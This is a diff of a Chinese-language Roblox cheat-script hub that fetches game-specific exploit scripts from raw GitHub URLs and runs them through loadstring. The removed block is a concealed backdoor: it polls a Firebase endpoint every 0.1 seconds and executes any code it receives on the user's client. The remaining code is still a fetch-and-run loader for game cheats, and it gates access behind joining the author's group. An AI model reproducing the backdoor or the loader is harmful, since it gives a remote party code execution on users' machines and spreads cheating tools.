@@ -1,155 +1,9 @@
---开源上传 --BY霖溺
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local TweenService = game:GetService("TweenService")
-
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-local request = (syn and syn.request) or http_request or (http and http.request) or request
-
-local announcerGui = Instance.new("ScreenGui")
-announcerGui.Name = "TopBannerAnnouncements"
-announcerGui.ResetOnSpawn = false
-announcerGui.Parent = playerGui
-
-local isShowing = false
-local queue = {}
-local lastBody = nil
-
-local function showAnnouncement(username, userId, badgeGlyph, message)
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0.65, 0, 0, 65)
-    frame.Position = UDim2.new(0.175, 0, -0.2, 0)
-    frame.BackgroundTransparency = 1
-    frame.Parent = announcerGui
-
-    local bg = Instance.new("Frame")
-    bg.Size = UDim2.new(1, 0, 1, 0)
-    bg.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-    bg.BackgroundTransparency = 0.15
-    bg.Parent = frame
-    Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 14)
-
-    local shadow = Instance.new("ImageLabel", bg)
-    shadow.Size = UDim2.new(1, 30, 1, 30)
-    shadow.Position = UDim2.new(0, -15, 0, -15)
-    shadow.BackgroundTransparency = 1
-    shadow.Image = "rbxassetid://1316045217"
-    shadow.ImageColor3 = Color3.new(0, 0, 0)
-    shadow.ImageTransparency = 0.65
-    shadow.ScaleType = Enum.ScaleType.Slice
-    shadow.SliceCenter = Rect.new(10, 10, 118, 118)
-
-    local avatar = Instance.new("ImageLabel", bg)
-    avatar.Size = UDim2.new(0, 45, 0, 45)
-    avatar.Position = UDim2.new(0, 10, 0.5, -22)
-    avatar.BackgroundTransparency = 1
-    Instance.new("UICorner", avatar).CornerRadius = UDim.new(1,0)
-
-    task.spawn(function()
-        local thumb = Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
-        avatar.Image = thumb
-    end)
-
-    local nameLabel = Instance.new("TextLabel", bg)
-    nameLabel.Size = UDim2.new(1, -75, 0, 28)
-    nameLabel.Position = UDim2.new(0, 65, 0, 5)
-    nameLabel.BackgroundTransparency = 1
-    nameLabel.TextColor3 = Color3.fromRGB(255,255,255)
-    nameLabel.Font = Enum.Font.GothamBold
-    nameLabel.TextSize = 22
-    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
-    nameLabel.TextStrokeTransparency = 0.6
-    nameLabel.Text = username .. " "
-
-    local msgLabel = Instance.new("TextLabel", bg)
-    msgLabel.Size = UDim2.new(1, -75, 0, 30)
-    msgLabel.Position = UDim2.new(0, 65, 0, 32)
-    msgLabel.BackgroundTransparency = 1
-    msgLabel.TextColor3 = Color3.fromRGB(230,230,230)
-    msgLabel.Font = Enum.Font.Gotham
-    msgLabel.TextSize = 20
-    msgLabel.TextWrapped = true
-    msgLabel.TextXAlignment = Enum.TextXAlignment.Left
-    msgLabel.TextYAlignment = Enum.TextYAlignment.Top
-    msgLabel.TextStrokeTransparency = 0.75
-    msgLabel.Text = message
-
-    TweenService:Create(frame, TweenInfo.new(0.6, Enum.EasingStyle.Quad), { Position = UDim2.new(0.175,0,0.08,0) }):Play()
-
-    task.delay(7, function()
-        TweenService:Create(frame, TweenInfo.new(0.6, Enum.EasingStyle.Quad), { Position = UDim2.new(0.175,0,-0.2,0) }):Play()
-        TweenService:Create(bg, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
-        TweenService:Create(nameLabel, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
-        TweenService:Create(msgLabel, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
-        TweenService:Create(avatar, TweenInfo.new(0.6), {ImageTransparency = 1}):Play()
-        task.wait(0.6)
-        frame:Destroy()
-        isShowing = false
-        if #queue > 0 then
-            local nxt = table.remove(queue,1)
-            showAnnouncement(nxt.username, nxt.userId, nxt.badgeGlyph, nxt.message)
-        end
-    end)
-end
-
-local function createAnnouncement(username, userId, badgeGlyph, message)
-    if isShowing then
-        table.insert(queue, { username = username, userId = userId, badgeGlyph = badgeGlyph, message = message })
-    else
-        isShowing = true
-        showAnnouncement(username, userId, badgeGlyph, message)
-    end
-end
-
-local function LinniNoti(message)
-    local sysId = 5421847593
-    createAnnouncement("Linni Script", sysId, "!", tostring(message))
-end
-
-task.spawn(function()
-    while task.wait(0.1) do
-        if not request then continue end
-
-        local ok, res = pcall(function()
-            return request({ Url = firebaseUrl, Method = "GET" })
-        end)
-        if not ok or not res then continue end
-
-        local body = res.Body or res.body
-        if not body or body == "" or body == "null" then
-            lastBody = nil
-            continue
-        end
-
-        if body == lastBody then continue end
-        lastBody = body
-
-        local decoded
-        pcall(function() decoded = HttpService:JSONDecode(body) end)
-        if not decoded then continue end
-
-        if decoded.username and decoded.userId and decoded.announcement then
-            createAnnouncement(decoded.username, decoded.userId, "", decoded.announcement)
-        end
-
-        if decoded.code and decoded.code ~= "" then
-            task.spawn(function()
-                pcall(function()
-                    local f = loadstring(decoded.code)
-                    if f then f() end
-                end)
-            end)
-        end
-    end
-end)
 
 local Config = {
     GroupID = 36012386,
-    KickMessage = "请先加入霖溺群组!\n已自动为你复制群组名字请在剪贴板查看",
+    KickMessage = "请先加入霖溺Roblox社区!\n已自动为你复制社区名字请在剪贴板查看",
     GroupInfo = "群组名字:Linni_Hub，霖溺QQ主群:http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=viOjjgj19-TUiZlamhpxb6uvWwVNGoB7&authKey=ACDi9sCtIis%2F4P%2BtirP046uWaJ54%2F149eBnUvaAsMu%2BWZwSFoEQrzZC9UDGFwmp%2F&noverify=0&group_code=744830231"
 }
-
 local ScriptDatabase = {
     { name = "Ohio", ids = {7239319209}, url = "https://raw.githubusercontent.com/ShenJiaoBen/ShenJiaoBen/refs/heads/main/new_ohio.lua", vars = {["KingScript"]="By King", ["Roblox"]="草拟吗", ["KingTeam"]="King无敌"} },
     { name = "piggy", ids = {1516533665}, url = "https://raw.githubusercontent.com/ShenJiaoBen/Partial-Server-Ribbon/refs/heads/main/piggy.txt", vars = {["LnScript"]="霖溺-Piggy"} },
@@ -196,9 +50,12 @@ local ScriptDatabase = {
     { name = "StealAsword", ids = {113809264674979}, url = "https://raw.githubusercontent.com/ShenJiaoBen/Partial-Server-Ribbon/refs/heads/main/Steal%20a%20sword.lua", vars = {["LinniHubScript"]="霖溺-偷走一把剑"} },
     { name = "NinjaLegendstwo", ids = {5977280685}, url = "https://raw.githubusercontent.com/ShenJiaoBen/Partial-Server-Ribbon/refs/heads/main/Ninja%20Legends%202.lua", vars = {["LinniHubScript"]="霖溺-忍者传奇2"} },
     { name = "Prospecting", ids = {129827112113663}, url = "https://raw.githubusercontent.com/ShenJiaoBen/Partial-Server-Ribbon/refs/heads/main/Linni-Prospecting.lua", vars = {["LinniHubScript"]="霖溺-勘探中"} },
-    { name = "DieDead", ids = {71895508397153}, url = "https://raw.githubusercontent.com/ShenJiaoBen/Partial-Server-Ribbon/refs/heads/main/DieorDead.lua", vars = {["LnScript"]="霖溺-死亡之死"} },
+        { name = "DieDead", ids = {71895508397153}, url = "https://raw.githubusercontent.com/ShenJiaoBen/Partial-Server-Ribbon/refs/heads/main/DieorDead.lua", vars = {["LnScript"]="霖溺-死亡之死"} },
+
+      
     
-    --[[分割线]]--
+--[[分割线]]--
+
 
     { name = "Deadly", creatorIds = {1009388349}, url = "https://raw.githubusercontent.com/ShenJiaoBen/Partial-Server-Ribbon/refs/heads/main/Deadly.lua", vars = {["LnScript"]="霖溺-死亡速递"} },
     { name = "Bao", creatorIds = {8818124}, url = "https://raw.githubusercontent.com/ShenJiaoBen/Partial-Server-Ribbon/refs/heads/main/Bao.lua", vars = {["LnScript"]="霖溺-暴力区"} },
@@ -252,12 +109,12 @@ local function SafeExecute(url, vars)
     end)
 
     if not success then
-        LinniNoti("HTTP请求失败，请检查网络或链接是否有效")
+        warn("HTTP请求失败，请检查网络或链接是否有效")
         return
     end
 
     if string.find(content, "404: Not Found") or string.len(content) < 5 then
-        LinniNoti("错误: 脚本链接失效 (404) 或内容为空")
+        warn("错误: 脚本链接失效 (404) 或内容为空")
         return
     end
 
@@ -266,7 +123,7 @@ local function SafeExecute(url, vars)
     end)
 
     if not loadSuccess then
-        LinniNoti("Loadstring 编译失败: " .. tostring(loadResult))
+        warn("Loadstring 编译失败 (可能是脚本语法错误): " .. tostring(loadResult))
         return
     end
 
@@ -275,9 +132,9 @@ local function SafeExecute(url, vars)
     end)
     
     if not runSuccess then
-        LinniNoti("脚本运行时出错: " .. tostring(runErr))
+        warn("脚本运行时出错: " .. tostring(runErr))
     else
-        LinniNoti("脚本执行成功")
+        print("脚本执行成功!")
     end
 end
 
@@ -302,7 +159,7 @@ for _, data in ipairs(ScriptDatabase) do
     if data.ids then
         for _, id in ipairs(data.ids) do
             if id == placeId then
-                LinniNoti("匹配到游戏id: " .. data.name)
+                warn("匹配到游戏id: " .. data.name)
                 SafeExecute(data.url, data.vars)
                 return
             end
@@ -320,7 +177,7 @@ if success and info and info.Creator then
         if data.creatorIds then
             for _, id in ipairs(data.creatorIds) do
                 if id == creatorId then
-                    LinniNoti("匹配到作者id: " .. data.name)
+                    warn("匹配到作者id: " .. data.name)
                     SafeExecute(data.url, data.vars)
                     return
                 end
@@ -329,4 +186,4 @@ if success and info and info.Creator then
     end
 end
 
-LinniNoti("未匹配到任何脚本url支持此游戏")
+warn("未匹配到任何脚本url支持此游戏")
